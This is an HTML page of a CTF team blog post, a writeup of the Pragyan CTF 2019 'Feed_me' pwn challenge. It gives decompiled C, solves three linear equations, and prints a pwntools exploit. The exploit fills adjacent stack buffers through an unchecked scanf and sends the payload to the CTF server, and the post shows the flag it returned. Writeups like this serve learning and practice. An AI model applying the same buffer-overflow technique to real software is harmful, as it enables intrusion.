@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Writeup: Pragyan CTF 2019 Feed_me :: Pystyy vetää — Open Finnish CTF team</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="In this pwn challenge we got a binary challenge1 as well as the online version with a flag, listening on the CTF server.
+A good chance to try out Ghidra, the NSA RE tool! So I launched it up, analyzed the binary, and took a look into the decompiled main function. It was very straightforward, and after renaming a few variables for clarity we can easily see the conditions we need to satisfy."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/writeup-pragyan-2019-feedme/" />
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/green.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Writeup: Pragyan CTF 2019 Feed_me :: Pystyy vetää — Open Finnish CTF team" />
+<meta name="twitter:description" content="In this pwn challenge we got a binary challenge1 as well as the online version with a flag, listening on the CTF server.
+A good chance to try out Ghidra, the NSA RE tool! So I launched it up, analyzed the binary, and took a look into the decompiled main function. It was very straightforward, and after renaming a few variables for clarity we can easily see the conditions we need to satisfy." />
+<meta name="twitter:site" content="/" />
+<meta name="twitter:creator" content="joohoi" />
+<meta name="twitter:image" content="/img/feedme_decompile.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Writeup: Pragyan CTF 2019 Feed_me :: Pystyy vetää — Open Finnish CTF team">
+<meta property="og:description" content="In this pwn challenge we got a binary challenge1 as well as the online version with a flag, listening on the CTF server.
+A good chance to try out Ghidra, the NSA RE tool! So I launched it up, analyzed the binary, and took a look into the decompiled main function. It was very straightforward, and after renaming a few variables for clarity we can easily see the conditions we need to satisfy." />
+<meta property="og:url" content="/posts/writeup-pragyan-2019-feedme/" />
+<meta property="og:site_name" content="Writeup: Pragyan CTF 2019 Feed_me" />
+<meta property="og:image" content="/img/feedme_decompile.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2019-03-10 17:38:03 &#43;0200 EET" />
+
+
+
+
+
+
+
+</head>
+<body class="">
+<div class="container">
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/" style="text-decoration: none;">
+  <div class="logo">
+    Pystyy vetää
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/posts">Blog</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/posts">Blog</a></li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  <div class="post">
+    <h1 class="post-title"><a href="/posts/writeup-pragyan-2019-feedme/">Writeup: Pragyan CTF 2019 Feed_me</a></h2>
+    <div class="post-meta">
+      <span class="post-date">
+        2019-03-10
+      </span>
+      <span class="post-author">:: joohoi</span>
+    </div>
+
+    
+
+    
+      <img src="/img/feedme_decompile.png" class="post-cover" />
+    
+
+    <div class="post-content">
+      <p>In this pwn challenge we got a binary <code>challenge1</code> as well as the online version with a flag, listening on the CTF server.</p>
+
+<p>A good chance to try out Ghidra, the NSA RE tool! So I launched it up, analyzed the binary, and took a look into the decompiled main function. It was very straightforward, and after renaming a few variables for clarity we can easily see the conditions we need to satisfy.</p>
+
+<p>The decompiled code was as follows:</p>
+
+<pre><code class="language-c">undefined8 main(void)
+
+{
+  int iVar1;
+  int x;
+  int y;
+  int z;
+  time_t tVar2;
+  size_t sVar3;
+  FILE *__stream;
+  long in_FS_OFFSET;
+  int local_9c;
+  char first_input [10];
+  char second_input [10];
+  char third_input [10];
+  char local_58 [56];
+  long local_20;
+  uint first;
+  uint second;
+  uint third;
+  
+  local_20 = *(long *)(in_FS_OFFSET + 0x28);
+  tVar2 = time((time_t *)0x0);
+  srand((uint)tVar2);
+  iVar1 = rand();
+  first = (iVar1 % 10000) * -2;
+  iVar1 = rand();
+  second = (iVar1 % 10000) * -2;
+  iVar1 = rand();
+  third = (iVar1 % 10000) * -2;
+  puts(&quot;Can you cook my favourite food using these ingredients :)&quot;);
+  printf(&quot;%d ; %d ; %d ;\n&quot;,(ulong)first,(ulong)second,(ulong)third);
+  __isoc99_scanf(&amp;DAT_00100de2,first_input);
+  local_9c = 0;
+  do {
+    sVar3 = strlen(first_input);
+    if (sVar3 &lt;= (ulong)(long)local_9c) {
+      x = atoi(first_input);
+      y = atoi(second_input);
+      z = atoi(third_input);
+      if (first == y + x) {
+        if (second == z + y) {
+          if (third == x + z) {
+            __stream = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+            if (__stream == (FILE *)0x0) {
+              fwrite(&quot;\nflag.txt doesn\'t exist.\n&quot;,1,0x19,stderr);
+                    /* WARNING: Subroutine does not return */
+              exit(0);
+            }
+            fgets(local_58,0x32,__stream);
+            printf(&quot;That\'s yummy.... Here is your gift:\n%s&quot;,local_58);
+          }
+          else {
+            fail();
+          }
+        }
+        else {
+          fail();
+        }
+      }
+      else {
+        fail();
+      }
+LAB_00100ccd:
+      if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
+        return 0;
+      }
+                    /* WARNING: Subroutine does not return */
+      __stack_chk_fail();
+    }
+    if (((first_input[(long)local_9c] &lt; '0') || ('9' &lt; first_input[(long)local_9c])) &amp;&amp;
+       (first_input[(long)local_9c] != '-')) {
+      puts(&quot;Invalid input :( &quot;);
+      goto LAB_00100ccd;
+    }
+    local_9c = local_9c + 1;
+  } while( true );
+}
+</code></pre>
+
+<p>And the conditions to satisfy:</p>
+
+<pre><code>first   = y + x
+second  = z + y
+third   = x + z
+</code></pre>
+
+<p>So with example run of challenge1 code:</p>
+
+<pre><code>▶ ./challenge1
+Can you cook my favourite food using these ingredients :)
+-14880 ; -7146 ; -5644 ;
+</code></pre>
+
+<p><code>first</code> being -14880, <code>second</code> being -7146 and <code>third</code> being -5644 would mean that:</p>
+
+<pre><code>x  = -14880 - y
+y  = -7146 - z
+z  = -5644 - x
+</code></pre>
+
+<p>So:</p>
+
+<pre><code>y  = -7146 - (-5644 - x)
+y  = -7146 - (-5644 - (-14880 -y))
+y  = -7146 + 5644 - 14880 - y
+2y = -7146 + 5644 - 14880
+2y = -16382
+y  = -8191
+</code></pre>
+
+<p>So:</p>
+
+<pre><code>x  = -14880 - (-8191)
+x  = -6689
+
+z  = -5644 - (-6689)
+z  = 1045
+</code></pre>
+
+<p>After solving the algorithm, we need to figure out how to send in the values. From the decompile, we can see that the (now renamed) varibles for <code>first_input</code>, <code>second_input</code> and <code>third_input</code> are initialized one after another in the stack. This means that we can (mis)use the nonexistent buffer length check of <code>__isoc99_scanf</code> to populate all of these variables even though only the first one is read into.</p>
+
+<p>To populate the variables with usable values, we need to terminate each one with null byte, and for this, it&rsquo;s practical to just pad the values with null bytes up to the initialized array length of <code>10</code> for each of the vars.</p>
+
+<p>The resulting exploit code using pwnlib looks like:</p>
+
+<pre><code class="language-python">from pwn import *                                                                
+                                                                                 
+class FeedMe(object):                                                            
+    def __init__(self, inputdata):                                               
+        # Parse and normalize the input data                                     
+        vals = inputdata.split(&quot;;&quot;)                                              
+        res = []                                                                 
+        for i in vals:                                                           
+            if i:                                                                
+                res.append(i.strip())                                            
+        self.first = int(res[0])                                                 
+        self.second = int(res[1])                                                
+        self.third = int(res[2])                                                 
+                                                                                 
+    def solve(self):                                                             
+        # Get x, y and z                                                         
+        y = (self.second - self.third + self.first) / 2                          
+        x = self.first - y                                                       
+        z = self.third - x                                                       
+        # Pad the values with null bytes to terminate the string and fill the buffer
+        return str(x).ljust(10, &quot;\x00&quot;) + str(y).ljust(10, &quot;\x00&quot;) + str(z).ljust(10, &quot;\x00&quot;)
+                                                                                 
+                                                                                 
+c = remote(&quot;159.89.166.12&quot;, 9800)                                                
+c.recvuntil(&quot;:)&quot;)                                                                
+                                                                                 
+indata = c.recv(2048, timeout=1)                                                 
+feeder = FeedMe(indata)                                                          
+retval = feeder.solve()                                                          
+c.send(retval+&quot;\n&quot;)                                                              
+print(c.recv(2048, timeout=1))
+</code></pre>
+
+<p>And running it gets us our flag:</p>
+
+<pre><code>▶ python feedme.py
+[+] Opening connection to 159.89.166.12 on port 9800: Done
+That's yummy.... Here is your gift:
+pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3}
+
+[*] Closed connection to 159.89.166.12 port 9800
+</code></pre>
+
+<p>Pystyy vetää!</p>
+
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+          
+            <span class="button next">
+              <a href="/posts/writeup-nullcon-2019-2fun/">
+                <span class="button__text">Writeup: nullcon HackIM 2019 - 2FUN</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+    
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2019 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+  
+</div>
+
+</body>
+</html>
